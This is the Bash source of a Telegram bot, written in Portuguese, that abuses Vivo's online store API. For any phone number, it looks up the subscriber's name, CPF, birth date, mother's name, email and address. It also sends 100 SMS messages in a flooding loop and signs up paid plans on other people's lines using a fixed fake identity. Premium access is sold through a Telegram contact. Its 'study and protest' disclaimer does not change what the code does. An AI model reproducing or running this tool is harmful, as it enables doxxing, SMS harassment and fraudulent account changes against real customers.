#!/usr/bin/env bash

function help_text {

	cat <<- TEXT
	
	Para que seja possível identificar um número de telefone válido, o mesmo deve estar no seguinte formato:
	
	_• Ele deve possuir 11 dígitos, incluindo o DDD e nono dígito_
	_• Ele precisa corresponder com o regex:_ \`[0-9]{11}\`
	
	TEXT

}

declare -rgf 'help_text'

function user_info_text {

	declare -r user_type=$(sqlite3 "${DatabasePath}" "SELECT user_type FROM data WHERE user_id = '${message_chat_id}';")
	declare -r membership_start_date=$(sqlite3 "${DatabasePath}" "SELECT membership_start_date FROM data WHERE user_id = '${message_chat_id}';")
	declare -r remaining_consultas_numero=$(sqlite3 "${DatabasePath}" "SELECT remaining_consultas_numero FROM data WHERE user_id = '${message_chat_id}';")
	declare -r remaining_ativacao_plano=$(sqlite3 "${DatabasePath}" "SELECT remaining_ativacao_plano FROM data WHERE user_id = '${message_chat_id}';")

	cat <<- TEXT
	
	*Tipo de usuário*: \`${user_type}\`
	*Consultas restantes*: \`${remaining_consultas_numero}\`
	*Ativações restantes*: \`${remaining_ativacao_plano}\`
	*Início do ciclo*: \`${membership_start_date}\`
	
	TEXT

}

declare -rgf 'user_info_text'

function flood_help_text {

	cat <<- TEXT

	Uso:
	
	\`/flood <número_móvel_e_ddd_aqui>\`
	ou
	\`!flood <número_móvel_e_ddd_aqui>\`
	
	Exemplo:
	
	\`/flood 19999999999\`
	ou
	\`!flood 19999999999\`
	
	Descrição:
	
	Use este comando para solicitar o envio em massa de mensagens de texto para linhas móveis. Funciona com qualquer operadora. Cada requisição enviará 100 mensagens ao número especificado.

	TEXT

}

declare -rgf 'flood_help_text'

function plano_help_text {

	cat <<- TEXT

	Uso:
	
	\`/plano <número_móvel_e_ddd>\`
	ou
	\`!plano <número_móvel_e_ddd>\`
	
	Exemplo:
	
	\`/plano 19999999999\`
	ou
	\`!plano 19999999999\`
	
	Descrição:
	
	Use este comando para solicitar a contratação de planos controle para linhas Vivo Pré.

	TEXT

}

declare -rgf 'plano_help_text'

function unknown_error_text {

	cat <<- TEXT
	
	Ocorreu um erro ao tentar processar sua solicitação.
	
	TEXT

}

function number_not_found_text {

	cat <<- TEXT
	
	Este número não foi encontrado na base de dados da Vivo.
	
	TEXT

}

declare -rgf 'number_not_found_text'

function start_text {

	cat <<- TEXT
	
	Você pode realizar as seguintes operações através deste bot:
	
	\* Para consultar informações a respeito do plano e/ou do titular de uma determinada linha Vivo Móvel, me envie o número %2b DDD.
	\* Para solicitar o envio em massa de mensagens de texto (spam) para linhas móveis, envie \`/flood\` seguido pelo número %2b DDD.
	\* Para solicitar a contratação de planos controle para linhas Vivo Pré, envie \`/plano\` seguido pelo número %2b DDD.
	
	Para saber quais tipos de formatos de números o bot aceita e quais são seus comportamentos padrões, clique em /help.
	
	Caso você queira fazer alguma sugestão, comentário ou apenas queira discutir sobre o projeto, entre no grupo de discussões [clicando aqui](https://t.me:443/joinchat/QQhXWUjDfYDS6FKUOIS1VQ).
	
	TEXT

}

declare -rgf 'start_text'

function about_text {

	cat <<- TEXT
	
	*Como?*
	
	Este bot se aproveita de algumas vulnerabilidades encontradas na API de login e autenticação de dados do Meu Vivo para realizar determinadas operações.
	
	*Porquê?*
	
	Mesmo após ser [processada por expor dados pessoais de clientes](https://tecnoblog.net:443/320931/vivo-acao-judicial-expor-dados-pessoais-clientes-meu-vivo), a Vivo insiste em continuar utilizando métodos inseguros de login e autenticação de dados em suas plataformas online. Esse descaso e falta de atenção não prejudica apenas a empresa em sí, mas, principalmente, prejudica os seus clientes e pessoas que depositam sua confiança na plataforma.
	
	*Propósito*
	
	Este bot tem como objetivo principal alertar usuários e não-usuários da Vivo sobre os métodos e as formas questionáveis de login e processamento de dados que a empresa utiliza em seus serviços online, tais como o Meu Vivo.
	
	Este bot também é visto como uma forma de protesto por parte de seus desenvolvedores.
	
	*Direitos legais*
	
	Este bot é destinado a fins de estudo e análise. Este é um software livre e de código aberto (disponível no GitHub em [Niruon/Nourin](https://github.com:443/Niruon/Nourin) sobre a [LGPL-3](https://github.com:443/Niruon/Nourin/blob/master/LICENSE)). Você é livre para alterar, analisar e redistribuir o código.
	
	Os desenvolvedores se isentam de toda e qualquer responsabilidade decorrente do mau uso desde software por parte de seus usuários.
	
	O uso desse software é de responsabilidade total do usuário. Use-o por sua conta e risco. 
	
	TEXT

}

declare -rgf 'about_text'

function common_results_text {

	cat <<- RESULTS
	
	*Titular*:
	
	*Nome*: \`$(get_object_value 'nome')\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "${JSONResponse}" | parse_output)\`
	*Documento*: \`$(get_object_value 'documento')\`
	*Classificação*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.classificacao' "${JSONResponse}" | parse_output)\`
	*Sexo*: \`$(jq --raw-output '.pessoa.descricaoSexo' "${JSONResponse}" | parse_output)\`
	*Nascimento*: \`$(get_object_value 'nascimento')\`
	*Mãe*: \`$(get_object_value 'mae')\`
	*E-mail*: \`$(jq --raw-output '.data.email' "${JSONResponse}" | parse_output)\`
	*Atualização:* \`$(jq --raw-output '.pessoa.documentos[][].dataUltimaAlteracao' "${JSONResponse}" | convert_epoch | parse_output)\`
	
	*Endereço*:
	
	*CEP*: \`$(jq --raw-output '.data.cep' "${JSONResponse}" | parse_output)\`
	*Endereço*: \`$(jq --raw-output '.data.endereco' "${JSONResponse}" | parse_output)\`
	*Número*: \`$(jq --raw-output '.data.numeroEndereco' "${JSONResponse}" | parse_output)\`
	*Bairro*: \`$(jq --raw-output '.data.bairro' "${JSONResponse}" | parse_output)\`
	*Cidade*: \`$(jq --raw-output '.data.cidade' "${JSONResponse}" | parse_output)\`
	*Estado*: \`$(jq --raw-output '.data.estado' "${JSONResponse}" | parse_output)\`
	*País*: \`$(jq --raw-output '.pessoa.documentos[][].pais.nome' "${JSONResponse}" | parse_output)\`
	*Nacionalidade*: \`$( jq --raw-output '.pessoa.documentos[][].pais.nacionalidade' "${JSONResponse}" | parse_output)\`
	
	*Linha*:
	
	*Assinatura*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.accountId' "${JSONResponse}" | parse_output)\`
	*Número*: \`$telephone\`
	*Ativação*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.creationDate' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "${JSONResponse}" | parse_output)\`
	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Custo*: \`$(jq --raw-output '.currentPlan.price' "${JSONResponse}" | parse_output)\`
	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "${JSONResponse}" | parse_output)\`
	*Ciclo mensal*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | parse_output)\`
	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "${JSONResponse}" | parse_output)\`
	
	RESULTS

}

declare -rgf 'common_results_text'

function cnpj_results_text {

	cat <<- RESULTS
	
	*Titular*:
	
	*Nome*: \`$(jq --raw-output '.pessoa.nomeCompleto' "${JSONResponse}" | parse_output)\`
	*Tipo*: \`$(jq --raw-output '.pessoa.descricaoTipoPessoa' "${JSONResponse}" | parse_output)\`
	*Documento*: \`$(jq --raw-output '.pessoa.documentos[][].numeroDocumento' "${JSONResponse}" | parse_output)\`
	*Classificação*: \`$(jq --raw-output '.pessoa.documentos[][].tipoDocumento.classificacao' "${JSONResponse}" | parse_output)\`
	
	*Linha*:
	
	*Assinatura*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.accountId' "${JSONResponse}" | parse_output)\`
	*Número*: \`$telephone\`
	*Ativação*: \`$(jq --raw-output '.ConsultInformactionLinhaResponseData.creationDate' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Pacote*: \`$(jq --raw-output '.pessoa.nomePlano' "${JSONResponse}" | parse_output)\`
	*Contratação*: \`$(jq --raw-output '.pessoa.dataAtivacaoAssinatura' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Atualização*: \`$(jq --raw-output '.pessoa.dataAlteracaoStatusAssinatura' "${JSONResponse}" | convert_epoch | parse_output)\`
	*Custo*: \`$(jq --raw-output '.currentPlan.price' "${JSONResponse}" | parse_output)\`
	*Status*: \`$(jq --raw-output '.pessoa.descricaoStatusAssinatura' "${JSONResponse}" | parse_output)\`
	*Ciclo mensal*: \`$(jq --raw-output '.data.vencimentoFatura' "${JSONResponse}" | parse_output)\`
	*Conta digital*: \`$(jq --raw-output '.data.contaDigital' "${JSONResponse}" | parse_output)\`
	
	RESULTS

}

declare -rgf 'cnpj_results_text'

function flood_done_dialog {

	cat <<- TEXT

	*Operação concluída.*

	*Linha*: \`$telephone\`
	*Operações realizadas:* \[\`$TotalOperations\`/\`100\`]
	*Mensagens enviadas:* \`$SuccessfullyFloods\`
	*Mensagens não enviadas:* \`$UnsuccessfullyFloods\`
	*Tempo decorrido*: \`$(( "${OperationEndedTimestamp}" - "${OperationStartedTimestamp}" )) segundos\`
	
	TEXT

}

declare -rgf 'flood_done_dialog'

function encode_text {

    (
    
        read -r 'DecodedText'
    
        declare -r BytesCount="${#DecodedText}"
        
        for (( i = 0; i < BytesCount; i++ )); do
            declare Character="${DecodedText:i:1}"
            case "${Character}" in
                [a-zA-Z0-9.~_-])
                    printf '%s' "${Character}"
                ;;
                *)
                    printf '%s' "${Character}" | xxd -p -c '1' | while read -r 'EncodedText'; do
                        printf "%%%s" "${EncodedText}"
                    done
                ;;
            esac
        done
    
    )

}

declare -rfg 'encode_text'

function parse_output {

	sed -r '/.*null.*/d' \
		| ( 
	 					
			read -r 'OriginalValue'
								
			if [ -z "${OriginalValue}" ]; then
				printf 'NÃO CLASSIFICADO'
			elif [ "${OriginalValue}" = 'true' ]; then
				printf 'SIM'
			else
				printf '%s' "${OriginalValue}"
			fi
			
		 ) | tr '[:lower:]' '[:upper:]' | encode_text
										

}

declare -rgf 'parse_output'

function convert_epoch {

	sed -r 's/\s|0{3}$//g' \
		| (
			
			read -r 'EpochDate'
			
			if ! date '+%d/%m/%Y' --date "@$EpochDate"; then
				date '+%d/%m/%Y' --date @"$(sed -r 's/0$//g' <<< "${EpochDate}")"
			fi
		)

}

declare -rgf 'convert_epoch'

function get_object_value {

	if [ "${1}" = 'nome' ]; then
		declare -r ObjectValue=$(jq --raw-output '.pessoa.nomeCompleto' "${JSONResponse}" | parse_output)
		if [ "${ObjectValue}" = 'N%c3%83O%20CLASSIFICADO' ]; then
			jq --raw-output '.data.nomeCompleto' "${JSONResponse}" | parse_output
		else
			printf '%s' "${ObjectValue}"
		fi
	elif [ "${1}" = 'documento' ]; then
		declare -r ObjectValue=$(jq --raw-output '.pessoa.numeroDocumento' "${JSONResponse}" | parse_output)
		if [ "${ObjectValue}" = 'N%c3%83O%20CLASSIFICADO' ]; then
			jq --raw-output '.data.cpf' "${JSONResponse}" | parse_output
		else
			printf '%s' "${ObjectValue}"
		fi
	elif [ "${1}" = 'nascimento' ]; then
		declare -r ObjectValue=$(jq --raw-output '.pessoa.dataNascimento' "${JSONResponse}" | convert_epoch | parse_output)
		if [ "${ObjectValue}" = 'N%c3%83O%20CLASSIFICADO' ]; then
			jq --raw-output '.data.dataNascimento' "${JSONResponse}" | parse_output
		else
			printf '%s' "${ObjectValue}"
		fi
	elif [ "${1}" = 'mae' ]; then
		declare -r ObjectValue=$(jq --raw-output '.pessoa.nomeDaMae' "${JSONResponse}" | parse_output)
		if [ "${ObjectValue}" = 'N%c3%83O%20CLASSIFICADO' ]; then
			jq --raw-output '.data.nomeMae' "${JSONResponse}" | parse_output
		else
			printf '%s' "${ObjectValue}"
		fi
	fi

}

declare -rgf 'get_object_value'

function save_session_data {

	declare -rg CookiesFile=$(mktemp --dry-run)
	
	declare -r HTMLDocument=$(mktemp --dry-run)

	curl --url "https://lojaonline.vivo.com.br/vivostorefront/checkout-express?site=vivo&plan=${plan_code}&packages=VIDEOEMUSICA&site=vivocontrolle&origin=lpcontrolegiga" \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'GET' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--cookie-jar "${CookiesFile}" \
		--output "${HTMLDocument}"
	
	declare -rg csrf_token=$(grep --max-count '1' --perl-regexp --only-matching --text 'CSRFToken.*"\b\K.+(?=")' "${HTMLDocument}")
	
}

declare -rgf 'save_session_data'

function set_environment_variables {

	declare -rg JSONResponse=$(mktemp --dry-run)
	declare -rg ServerHeaders=$(mktemp --dry-run)

	declare -rg random_cpf=$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3').$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3').$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '3')-$(tr --delete --complement '0-9' < '/dev/urandom' | head -c '2')
	
	declare -r random_number=$(shuf --input-range '1-9'  --random-source '/dev/urandom' --head-count '1')
	
	if [ "${random_number}" = '1' ]; then
		plan_code='VIVOCTRLF44N'
	elif [ "${random_number}" = '2' ]; then
		plan_code='VIVOCTRLF45N'
	elif [ "${random_number}" = '3' ]; then
		plan_code='VIVOCTRLF46N'
	elif [ "${random_number}" = '4' ]; then
		plan_code='VIVOCTRLF34N'
	elif [ "${random_number}" = '5' ]; then
		plan_code='VIVOCTRLF34A'
	elif [ "${random_number}" = '6' ]; then
		plan_code='VIVOCTRLF48N'
	elif [ "${random_number}" = '7' ]; then
		plan_code='VIVOCTRLF49N'
	elif [ "${random_number}" = '8' ]; then
		plan_code='VIVOCTRLF50N'
	elif [ "${random_number}" = '9' ]; then
		plan_code='VIVOCTRLF51N'
	fi
	
	declare -rg 'plan_code'
	
}

declare -rgf 'set_environment_variables'

function check_json_response {

	if [[ $(grep --max-count '1' --perl-regexp --only-matching --text '^HTTP/[0-9](\.[0-9]+)\s\K.+(?=\ )' "${ServerHeaders}") != '200' ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text "$(unknown_error_text)" \
			--parse_mode 'markdown'
		exit '1'
	elif [[ -z $(jq --raw-output '.' "${JSONResponse}") ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text "$(unknown_error_text)" \
			--parse_mode 'markdown'
		exit '1'
	fi
	
	if [[ $(jq --raw-output '.isLineVivo' "${JSONResponse}") = 'false' ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text "$(number_not_found_text)" \
			--parse_mode 'markdown'
		exit '1'
	elif [[ $(jq --raw-output '.isPortability' "${JSONResponse}") = 'true' ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text "$(number_not_found_text)" \
			--parse_mode 'markdown'
		exit '1'
	fi
	
	if [[ $(jq --raw-output '.pessoa.descricaoTipoPessoa' "${JSONResponse}") = 'PESSOA JURÍDICA' ]]; then
		declare -rg PessoaJuridica='true'
	fi
	
	if [[ $(jq --raw-output '.error' "${JSONResponse}") = 'Ocorreu um erro com o sistema'* ]]; then
		if ! [[ $(jq --raw-output '.pessoa.numeroDocumento' "${JSONResponse}") =~ [0-9]{11} ]]; then
			if [ "${PessoaJuridica}" != 'true' ]; then
				editMessageText --chat_id "${message_chat_id}" \
				--message_id "${result_message_id}" \
				--text "$(unknown_error_text)" \
				--parse_mode 'markdown'
				exit '1'
			fi
		fi
	fi
	
	return '0'
	
}

declare -rgf 'check_json_response'

function query_number {

	check_database_consulta_numero
	
	sendMessage --reply_to_message_id "${message_message_id}" \
		--chat_id "${message_chat_id}" \
		--text 'Consultando informações na base de dados...' \
		--disable_notification 'true'
	
	set_environment_variables
	
	save_session_data
	
	curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/validateLine' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--dump-header "${ServerHeaders}" \
		--cookie "${CookiesFile}" \
		--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
		--output "${JSONResponse}"
	
	if [[ $(jq --raw-output '.pessoa.numeroDocumento' "${JSONResponse}") =~ [0-9]{11} ]]; then
	
		declare -r AnotherJSONResponse=$(mktemp --dry-run)
		declare -r AnotherServerHeaders=$(mktemp --dry-run)
		
		declare -r formatted_cpf=$(sed -r 's/^([0-9]{3})([0-9]{3})([0-9]{3})([0-9]{2})$/\1.\2.\3-\4/g' <<< $(jq --raw-output '.pessoa.numeroDocumento' "${JSONResponse}"))
		
		curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/validateLine' \
			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
			--request 'POST' \
			--silent \
			--tls-max '1.2' \
			--header 'User-Agent:' \
			--header 'Accept:' \
			--ipv4 \
			--connect-timeout '25' \
			--cacert "${CACertificateFile}" \
			--capath "${CACertificateDirectory}" \
			--no-sessionid \
			--no-keepalive \
			--dump-header "${AnotherServerHeaders}" \
			--cookie "${CookiesFile}" \
			--data "planCode=${plan_code}&document=${formatted_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
			--output "${AnotherJSONResponse}"
		
		if [[ -n $(jq --raw-output '.' "${AnotherJSONResponse}") ]]; then
			mv --force --no-target-directory "${AnotherJSONResponse}" "${JSONResponse}"
			mv --force --no-target-directory "${AnotherServerHeaders}" "${ServerHeaders}"
		fi
	fi
	
	check_json_response
	
	editMessageText --chat_id "${message_chat_id}" \
		--message_id "${result_message_id}" \
		--text "$(if [ "${PessoaJuridica}" != 'true' ]; then common_results_text; else cnpj_results_text; fi)" \
		--parse_mode 'markdown' 
	
	update_database_consulta_numero
	
	exit '0'
	
}

declare -rgf 'query_number'

function flood_number {
	
	sendMessage --reply_to_message_id "${message_message_id}" \
		--chat_id "${message_chat_id}" \
		--text 'Enviando mensagens...' \
		--disable_notification 'true'
	
	set_environment_variables

	declare SuccessfullyFloods='0'
	declare UnsuccessfullyFloods='0'
	declare TotalOperations='0'

	save_session_data

	curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/validateLine' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--cookie "${CookiesFile}" \
		--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
		--output "${JSONResponse}"
	
	declare -r OperationStartedTimestamp=$(printf '%(%s)T')

	while true; do
		curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/re-send-token' \
			--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
			--request 'POST' \
			--silent \
			--tls-max '1.2' \
			--header 'User-Agent:' \
			--header 'Accept:' \
			--ipv4 \
			--connect-timeout '25' \
			--cacert "${CACertificateFile}" \
			--capath "${CACertificateDirectory}" \
			--no-sessionid \
			--no-keepalive \
			--cookie "${CookiesFile}" \
			--data "planCode=${plan_code}&document=${random_cpf}&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
			--output "${JSONResponse}"
		
		(( TotalOperations="TotalOperations+1" ))
		
		if [[ $(jq --raw-output '.success' "${JSONResponse}") =~ .+ ]]; then
			(( SuccessfullyFloods="SuccessfullyFloods+1" ))
		else
			(( UnsuccessfullyFloods="UnsuccessfullyFloods+1" ))
		fi
		
		if [ "${TotalOperations}" -ge '100' ]; then
			declare -r OperationEndedTimestamp=$(printf '%(%s)T')
			editMessageText --chat_id "${message_chat_id}" \
				--message_id "${result_message_id}" \
				--text "$(flood_done_dialog)" \
				--parse_mode 'markdown' 
			break
		fi
	done

	exit '0'

}

declare -rgf 'flood_number'

function save_order_session_data {

	declare -g CookiesFile=$(mktemp --dry-run)
	declare -g HTMLDocument=$(mktemp --dry-run)

	curl --url "https://lojaonline.vivo.com.br/vivostorefront/checkout-express?plan=${plan_code}" \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'GET' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--cookie-jar "${CookiesFile}" \
		--output "${HTMLDocument}"
	
	declare -g csrf_token=$(grep --max-count '1' --perl-regexp --only-matching --text 'CSRFToken.*"\b\K.+(?=")' "${HTMLDocument}")
	
	declare -g JSONResponse=$(mktemp --dry-run)
	declare -g ServerHeaders=$(mktemp --dry-run)
	
	curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/validateLine' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--dump-header "${ServerHeaders}" \
		--cookie "${CookiesFile}" \
		--data "planCode=${plan_code}&document=029.154.362-66&phone=${formatted_telephone}&CSRFToken=${csrf_token}" \
		--output "${JSONResponse}"
	
	check_json_response
	
	if [[ $(jq --raw-output '.error' "${JSONResponse}") = 'Este número de telefone não pertence ao CPF informado.' ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text 'Esta linha já possui um plano pós, controle ou Vivo Easy ativo. Não é possível realizar novas contratações.' 
		exit '1'
	elif [[ $(jq --raw-output '.error' "${JSONResponse}") = 'Linha possui migração em andamento.' ]]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text 'Esta linha se encontra em processo de migração. Aguarde a conclusão do processo antes de tentar contratar um novo plano.'
		exit '1'
	fi
	
}

declare -rgf 'save_order_session_data'

function place_plan_order {

	declare -g ServerHeaders=$(mktemp --dry-run)

	curl --url 'https://lojaonline.vivo.com.br/vivostorefront/checkout-express/placeOrder' \
		--resolve 'lojaonline.vivo.com.br:443:177.79.246.169' \
		--request 'POST' \
		--silent \
		--tls-max '1.2' \
		--header 'User-Agent:' \
		--header 'Accept:' \
		--ipv4 \
		--connect-timeout '25' \
		--cacert "${CACertificateFile}" \
		--capath "${CACertificateDirectory}" \
		--no-sessionid \
		--no-keepalive \
		--dump-header "${ServerHeaders}" \
		--cookie "${CookiesFile}" \
		--data "skuPlano=${plan_code}&fluxo=exchange&ciclo=10&vencimentoFatura=26&numeroEscolhido=&nomeCompleto=CAIO+NASCIMENTO+GARCIA&linha=${formatted_telephone}&telefoneContato=${formatted_telephone}&email=${random_email}&cpf=029.154.362-66&dataNascimento=06%2F12%2F1999&nomeMae=CAIO+NASCIMENTO+GARCIA&cep=69100-063&bairro=CENTRO&cidade=ITACOATIARA&estado=AM&endereco=PARQUE&numeroEndereco=${random_address_number}&complementoEndereco=&radio-number-options=&radio-billing-cycle=10&contaDigital=true&radio-conta=false&CSRFToken=${csrf_token}" \
		--output "${JSONResponse}"
	
}

declare -rgf 'place_plan_order'

function place_order {

	check_database_ativacao_planos

	sendMessage --reply_to_message_id "${message_message_id}" \
		--chat_id "${message_chat_id}" \
		--text 'Processando sua solicitação...' \
		--disable_notification 'true'

	declare -r random_email="$(tr -dc 'a-z0-9' < '/dev/urandom' | head -c '15')%40gmail.com"
	declare -r random_address_number="$(tr -dc '0-9' < '/dev/urandom' | head -c '4')"
	
	for plan_code in 'VIVOCTRLF51N' 'VIVOCTRLF50N' 'VIVOCTRLF49N'; do
		save_order_session_data
		place_plan_order
		check_json_response
		if [[ $(jq --raw-output '.OrderCode' "${JSONResponse}") =~ [0-9]+ ]]; then
			editMessageText --chat_id "${message_chat_id}" \
				--message_id "${result_message_id}" \
				--text "O plano \`${plan_code}\` foi ativado com sucesso na linha \`${telephone}\`." \
				--parse_mode 'markdown' 
			update_database_ativacao_planos
			exit '0'
		fi
	done

	if [ "${?}" = '1' ]; then
		editMessageText --chat_id "${message_chat_id}" \
			--message_id "${result_message_id}" \
			--text 'Não foi possível ativar nenhum plano controle nesta linha.' \
			--parse_mode 'markdown' 
		exit '1'
	fi
	
}

declare -rgf 'place_order'

function check_if_number_is_valid {

	if ! [[ "${telephone}" =~ ^[0-9]{11}$ ]]; then
		exit '1'
	else
		declare -rg formatted_telephone=$(sed -r 's/^([0-9]{2})/(\1)/g; s/([0-9]{4})$/-\1/g; s/([0-9]{5})/+\1/g' <<< "${telephone}")
	fi

}

declare -rgf 'place_order'

function update_database_consulta_numero {

if [ "${user_type}" = 'free' ]; then
	sqlite3 "${DatabasePath}" "UPDATE data SET
		remaining_consultas_numero = remaining_consultas_numero - 1
		WHERE user_id = '${message_chat_id}';"
fi

}

function check_database_consulta_numero {

	if [ "${remaining_consultas_numero}" -le '0' ]; then
		sendMessage --reply_to_message_id "${message_message_id}" \
			--chat_id "${message_chat_id}" \
			--text 'Você atingiu o limite máximo de consultas de números. Aguarde até que o seu ciclo semanal seja resetado ou adquira um acesso premium ilimitado de 15 dias com o @CarlosPenha.' \
			--disable_notification 'true'
		exit '1'
	fi

}

declare -rfg 'check_database_consulta_numero'

function update_database_ativacao_planos {

	if [ "${user_type}" = 'free' ]; then
		sqlite3 "${DatabasePath}" "UPDATE data SET
			remaining_ativacao_plano = remaining_ativacao_plano - 1
			WHERE user_id = '${message_chat_id}';"
	fi

}

declare -rfg 'update_database_ativacao_planos'

function check_database_ativacao_planos {

	if [ "${remaining_ativacao_plano}" -le '0' ]; then
		sendMessage --reply_to_message_id "${message_message_id}" \
			--chat_id "${message_chat_id}" \
			--text 'Você atingiu o limite máximo de ativação de planos. Aguarde até que o seu ciclo semanal seja resetado ou adquira um acesso premium ilimitado de 15 dias com o @CarlosPenha.' \
			--disable_notification 'true'
		exit '1'
	fi

}

declare -rfg 'check_database_consulta_numero'
 
function check_user_status {

declare -rg user_type=$(sqlite3 "${DatabasePath}" "SELECT user_type FROM data WHERE user_id = '${message_chat_id}';")
declare -rg membership_start_date=$(sqlite3 "${DatabasePath}" "SELECT membership_start_date FROM data WHERE user_id = '${message_chat_id}';")

	if ! [[  "${user_type}" =~ (free|premium) ]]; then
		sqlite3 "${DatabasePath}" "INSERT INTO data VALUES(
			'${message_chat_id}',
			'free',
			'15',
			'3',
			'$(printf '%(%s)T')' );"
	elif [ "${user_type}" = 'free' ]; then
		if [[ $(( "$(printf '%(%s)T')" - "${membership_start_date}" )) -ge '604800' ]]; then
			sqlite3 "${DatabasePath}" "UPDATE data SET
				remaining_consultas_numero = '15',
				remaining_ativacao_plano = '3',
				membership_start_date = '$(printf '%(%s)T')'
				WHERE user_id = '${message_chat_id}';"
		fi
	elif [ "${user_type}" = 'premium' ]; then
		if [[ $(( "$(printf '%(%s)T')" - "${membership_start_date}" )) -ge '1296000' ]]; then
			sendMessage --reply_to_message_id "${message_message_id}" \
				--chat_id "${message_chat_id}" \
				--text 'Seu acesso premium expirou. Renove-o caso queira continuar utilizando esta ferramenta.' \
				--disable_notification 'true'
			exit '1'
		fi
	fi

declare -rg remaining_consultas_numero=$(sqlite3 "${DatabasePath}" "SELECT remaining_consultas_numero FROM data WHERE user_id = '${message_chat_id}';")
declare -rg remaining_ativacao_plano=$(sqlite3 "${DatabasePath}" "SELECT remaining_ativacao_plano FROM data WHERE user_id = '${message_chat_id}';")

}

declare -rfg 'check_user_status'
